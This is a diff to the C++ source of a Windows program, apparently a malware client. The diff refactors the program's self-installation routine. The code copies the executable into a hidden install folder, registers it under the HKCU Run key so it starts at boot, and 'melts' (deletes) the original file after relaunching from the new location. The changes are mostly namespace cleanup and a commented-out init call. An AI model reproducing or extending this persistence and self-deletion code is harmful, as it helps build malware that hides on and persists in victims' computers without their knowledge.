@@ -3,15 +3,16 @@
 					SETTINGS CAN BE EDITED IN "settings.cpp"
 
 */
-
+#define WIN32_LEAN_AND_MEAN
 
 #include "includes.h"
 
-using namespace std;
+
+
 
 //TESTFUNC
 
-void testMB(string s)		//TEST FUNCTION
+void testMB(std::string s)		//TEST FUNCTION
 {
 	MessageBox(0, s.c_str(), "THIS IS A TEST", 0);
 }
@@ -22,7 +23,7 @@ void testMB(string s)		//TEST FUNCTION
 
 void setLocation()			//sets location(copies file)
 {
-	if (!directoryExists(installFolder.c_str()))
+	if (!General::directoryExists(installFolder.c_str()))
 		if (!CreateDirectory(installFolder.c_str(), NULL))	//tries to create folder		
 		{
 																						//[MAYBE DO SOMETHING LATER IF IT FAILS - PERHAPS REROUTE INSTALL TO APPDATA]
@@ -42,7 +43,7 @@ bool locationSet()		//checks if executable is located in install position
 
 bool startupSet()		//checks if executable is starting on boot
 {
-	if (regValueExists(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName.c_str()))
+	if (General::regValueExists(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings::startupName.c_str()))
 		return true;
 	else
 		return false;
@@ -59,28 +60,28 @@ bool installed()		//checks if executable is installed properly (location + start
 void installCheck()		//checks if this run of the program is designated to the install process, then checks whether it should start the installed client
 {
 	if (installing)
-		if (!startOnNextBoot)
+		if (!Settings::startOnNextBoot)
 		{
-			startProcess(installPath.c_str(), meltSelf ? convStringToLPTSTR("t " + currentPath) : NULL);		//REPLACE NULL TO, "meltSelf ? 'CURRENTPATH' : NULL"	WHEN CREATEPROCESS FIXED
+			General::startProcess(installPath.c_str(), Settings::meltSelf ? convStringToLPTSTR("t " + currentPath) : NULL);		//REPLACE NULL TO, "meltSelf ? 'CURRENTPATH' : NULL"	WHEN CREATEPROCESS FIXED
 		}
 
 }
 
-int init()		//startup of program
+bool init()		//startup of program
 {
 	//VARIABLE SETUP
-	currentPath = getCurrentPath();
-	installFolder = getInstallFolder();
-	installPath = getInstallPath(installFolder);
+	currentPath = General::getCurrentPath();
+	installFolder = General::getInstallFolder();
+	installPath = General::getInstallPath(installFolder);
 
 
 
-	if (!(lpArguments == NULL || (lpArguments[0] == 0)) && meltSelf)
+	if (!(lpArguments == NULL || (lpArguments[0] == 0)) && Settings::meltSelf)		//checks if arguments are supplied (path of old file) and then melts given file (if any)
 	{
 		remove(lpArguments);
 	}
 
-	if (installSelf)
+	if (Settings::installSelf)
 	{
 		if (!locationSet())				//checks if it is at it's destined location (config in settings.h)
 		{
@@ -89,20 +90,22 @@ int init()		//startup of program
 		}
 	}
 
-	if (setStartupSelf)
+	if (Settings::setStartupSelf)
 	{
-		if (!startupSet())
+		if (!startupSet())				//checks if it's startup is set
 		{
-			setStartup(convStringToWidestring(startupName).c_str(), installSelf ? convStringToWidestring(installPath).c_str() : convStringToWidestring(currentPath).c_str(), NULL);
+			General::setStartup(convStringToWidestring(Settings::startupName).c_str(), Settings::installSelf ? convStringToWidestring(installPath).c_str() : convStringToWidestring(currentPath).c_str(), NULL);
 		}
 	}
 	
 
-	installCheck();
+	installCheck();			//checks if this run of the program is designated to the install process, then checks whether it should start the installed client
 
 
-	return installing ? 1 : 0;
+	return installing;
 }
+
+
 
 
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)	//main function
@@ -110,10 +113,11 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdL
 	//VARIABLE SETUP
 	lpArguments = lpCmdLine;
 
-
-	if (init() == 1)
+	/*
+	if (init())
 		return 0;
-
+	*/
+	//test stuff (WORKS \o/)
 
 	return 0;
 }
